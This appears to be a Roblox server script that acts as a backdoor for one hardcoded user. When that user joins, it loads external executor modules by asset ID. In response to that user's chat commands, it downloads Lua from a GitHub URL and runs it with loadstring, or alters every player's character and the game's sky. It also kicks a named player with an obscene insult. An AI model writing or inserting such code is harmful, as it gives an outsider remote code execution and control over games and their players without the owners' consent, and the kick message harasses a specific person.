print("Ta")
local HttpService = game.HttpService

local EnabledDoDOS = true
local BlackList = {
	["Vad_75"]=true, --< Vadik Pidorasik
}
local AdminPanel = {
	["t10_kol"]=true,
}

game.Players.PlayerAdded:Connect(function(plr)
	if EnabledDoDOS==false then return end
	if BlackList[plr.Name] then
		plr:Kick("Соси Хуй Вад 😀")
	end
	if AdminPanel[plr.Name] then
		require(7192763922).load(plr.Name)
	end

end)

for _, player in pairs(game.Players:GetPlayers()) do
	if player.Name == "t10_kol" then
		player.Chatted:Connect(function(message)
			if message == "ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
			elseif message == "ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)
					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
			elseif message == "ADM.Executor" then
				require(6324372525).fse("t10_kol")
									local Part = Instance.new("Part",workspace)
					Part.CanCollide=true
					Part.CFrame = player.Character.Torso.CFrame
				elseif message == "ADM.Executor2" then
							local Part = Instance.new("Part",workspace)
					Part.CanCollide=true
					Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod("t10_kol")
			end
				--rbxassetid://7606070501
		end)
	end
end
